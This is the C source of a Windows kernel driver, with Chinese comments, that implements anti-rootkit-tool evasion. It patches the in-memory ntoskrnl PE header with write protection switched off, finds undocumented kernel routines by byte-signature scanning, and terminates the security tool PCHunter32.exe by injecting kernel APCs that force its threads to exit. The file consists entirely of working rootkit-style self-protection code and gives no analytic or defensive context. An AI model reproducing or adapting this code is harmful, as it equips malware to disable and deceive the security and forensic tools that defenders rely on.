#include "AntiArkTool.h"
#include "Util.h"
#include "UnDocoumentSpec.h"

VOID KillProcess(PEPROCESS pEProcess);
ULONG GetPspTerminateThreadByPointer();
ULONG GetPspExitThread(ULONG PspTerminateThreadByPointer);
VOID SelfTerminateThread(
	KAPC *Apc,
	PKNORMAL_ROUTINE *NormalRoutine,
	PVOID *NormalContext,
	PVOID *SystemArgument1,
	PVOID *SystemArgument2);
typedef VOID(NTAPI *fpTypePspExitThread)(
	IN NTSTATUS ExitStatus
	);
fpTypePspExitThread g_fpPspExitThreadAddr = NULL;

HANDLE g_prePcHunterID = 0;


BOOLEAN AntiArk(PDRIVER_OBJECT pDriver)
{
	BOOLEAN bRet = TRUE;
	//修改ntosk的pe头
	PVOID pNtosKernel = NULL;
	PLDR_DATA_TABLE_ENTRY pLdr = (PLDR_DATA_TABLE_ENTRY)pDriver->DriverSection;
	LIST_ENTRY *pTemp = &pLdr->InLoadOrderLinks;
	do
	{
		PLDR_DATA_TABLE_ENTRY pDriverInfo = (PLDR_DATA_TABLE_ENTRY)pTemp;
		if (!MmIsAddressValid(pDriverInfo->BaseDllName.Buffer)) continue;
		//KdPrint(("%wZ\n", &pDriverInfo->BaseDllName));
		if (wcsstr(pDriverInfo->BaseDllName.Buffer, L"ntoskrnl.exe") ||
			wcsstr(pDriverInfo->BaseDllName.Buffer, L"ntkrnlpa.exe") ||
			wcsstr(pDriverInfo->BaseDllName.Buffer, L"ntkrnlmp.exe") ||
			wcsstr(pDriverInfo->BaseDllName.Buffer, L"ntkrpamp.exe") ||
			wcsstr(pDriverInfo->BaseDllName.Buffer, L"ntkrnlup.exe")
			)
		{
			pNtosKernel = pDriverInfo->DllBase;
			break;
		}
		pTemp = pTemp->Blink;
	} while (pTemp != &pLdr->InLoadOrderLinks);

	if (NULL != pNtosKernel)
	{
		PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pNtosKernel;
		PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((SIZE_T)pNtosKernel + pDosHeader->e_lfanew);
		OffMemProtect();
		pNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress = 1;
		pNtHeader->OptionalHeader.AddressOfEntryPoint = 0;
		OnMemProtect();
	}

	return bRet;
}



void KillArk()
{
	//提前把函数查找出来
	ULONG uPspTerminateThreadByPointerAddr = GetPspTerminateThreadByPointer();
	if (0 == uPspTerminateThreadByPointerAddr)
	{
		KdPrint(("查找PspTerminateThreadByPointerAddr地址出错\n"));
		return;
	}
	g_fpPspExitThreadAddr = (fpTypePspExitThread)GetPspExitThread(uPspTerminateThreadByPointerAddr);
	if (NULL == g_fpPspExitThreadAddr)
	{
		KdPrint(("查找PspExitThread地址出错\n"));
		return;
	}
	//
	PEPROCESS pEProc = NULL;
	ULONG i = 0;
	for (i = 4; i < 0x25600; i = i + 4) 
	{
		pEProc = LookupProcess((HANDLE)i);
		if (!pEProc) continue;
		PUCHAR szProcessName = PsGetProcessImageFileName(pEProc);
		HANDLE processId = PsGetProcessId(pEProc);

		if (!strncmp(szProcessName, "PCHunter32.exe", 20))
		{
			KdPrint(("杀掉进程:%s\n", szProcessName));
			if (g_prePcHunterID != processId)
			{
				KillProcess(pEProc);
				g_prePcHunterID = processId;
			}
		}
		ObDereferenceObject(pEProc);
	}
}

VOID KillProcess(PEPROCESS pEProcess)
{
	PEPROCESS pEProc = NULL;
	PETHREAD  pEThrd = NULL;
	ULONG i = 0;

	for (i = 4; i < 0x25600; i += 4)
	{
		pEThrd = LookupThread((HANDLE)i);
		if (!pEThrd)  continue;
		pEProc = IoThreadToProcess(pEThrd);
		if (pEProc == pEProcess)
		{
			PKAPC pApc = NULL;
			pApc = (PKAPC)ExAllocatePool(NonPagedPool, sizeof(KAPC));
			if (NULL == pApc) return;
			//插入内核apc
			KeInitializeApc(pApc, (PKTHREAD)pEThrd, OriginalApcEnvironment, (PKKERNEL_ROUTINE)&SelfTerminateThread, NULL, NULL, 0, NULL);
			KeInsertQueueApc(pApc, NULL, 0, 2);

		}
		ObDereferenceObject(pEThrd);
	}
}


VOID SelfTerminateThread(
	KAPC *Apc,
	PKNORMAL_ROUTINE *NormalRoutine,
	PVOID *NormalContext,
	PVOID *SystemArgument1,
	PVOID *SystemArgument2)
{
	ExFreePool(Apc);
	g_fpPspExitThreadAddr(STATUS_SUCCESS);
}

ULONG GetPspTerminateThreadByPointer()
{
	UNICODE_STRING funcName;
	RtlInitUnicodeString(&funcName, L"PsTerminateSystemThread");
	ULONG step = 0;
	ULONG targetFunAddr = 0;
	ULONG baseFunAddr = (ULONG)MmGetSystemRoutineAddress(&funcName);
	for (step = baseFunAddr; step < (baseFunAddr + 1024); step++)
	{
		//searching for 0x50,0xe8
		if (((*(PUCHAR)(UCHAR*)(step - 1)) == 0x50) && ((*(PUCHAR)(UCHAR*)(step)) == 0xe8))
		{
			ULONG offset = *(PULONG)(step + 1);
			targetFunAddr = step + 5 + offset;
			break;
		}
	}
	return targetFunAddr;
} //PspExitThread stamp code:0x0c 0xe8

ULONG GetPspExitThread(ULONG PspTerminateThreadByPointer)
{
	ULONG step = 0;
	ULONG targetFunAddr = 0;
	ULONG baseFunc = PspTerminateThreadByPointer;
	for (step = baseFunc; step < (baseFunc + 1024); step++)
	{
		//searching for 0x0c,0xe8
		if (((*(PUCHAR)(UCHAR*)(step - 1)) == 0x0c) && ((*(PUCHAR)(UCHAR*)(step)) == 0xe8))
		{
			ULONG m_offset = *(PULONG)(step + 1);
			targetFunAddr = step + 5 + m_offset;
			break;
		}
	}
	return targetFunAddr;
}




